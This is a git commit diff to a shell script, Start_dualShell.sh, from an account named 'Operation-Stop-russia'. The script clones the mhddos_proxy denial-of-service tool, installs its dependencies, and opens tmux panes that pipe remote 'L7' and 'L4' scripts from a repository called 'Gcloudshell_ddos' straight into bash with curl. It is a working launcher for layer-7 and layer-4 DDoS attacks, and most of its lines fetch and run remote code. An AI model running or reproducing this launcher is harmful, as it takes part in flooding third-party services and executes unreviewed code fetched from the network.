a2301b1bffaeb801a3e02cdef2ace2a5f501a6bf
Operation-Stop-russia <103530329+Operation-Stop-russia@users.noreply.github.com>
2022-04-17 21:41:27 +0300

    Update Start_dualShell.sh

--- Start_dualShell.sh
+++ Start_dualShell.sh
@@ -3,8 +3,8 @@
 
 #tmux kill-session -t dualshell; pkill node
 #rm -rf dualshell
-#mkdir dualshell
-#cd dualshell
+mkdir dualshell
+cd dualshell
 
 grep -qxF 'set -g mouse on' ~/.tmux.conf || echo 'set -g mouse on' >> ~/.tmux.conf
 tmux source-file ~/.tmux.conf
@@ -13,6 +13,6 @@ git clone https://github.com/porthole-ascend-cinnamon/mhddos_proxy.git
 cd mhddos_proxy
 python3 -m pip install -r requirements.txt
 
-tmux split-window -v -p 99 'curl -s https://raw.githubusercontent.com/Operation-Stop-russia/Gcloudshell_ddos/main/L7 | bash'
+tmux split-window -v -p 100 'curl -s https://raw.githubusercontent.com/Operation-Stop-russia/Gcloudshell_ddos/main/L7 | bash'
 sleep 0.1
 tmux split-window -h -p 50 'curl -s https://raw.githubusercontent.com/Operation-Stop-russia/Gcloudshell_ddos/main/L4 | bash'
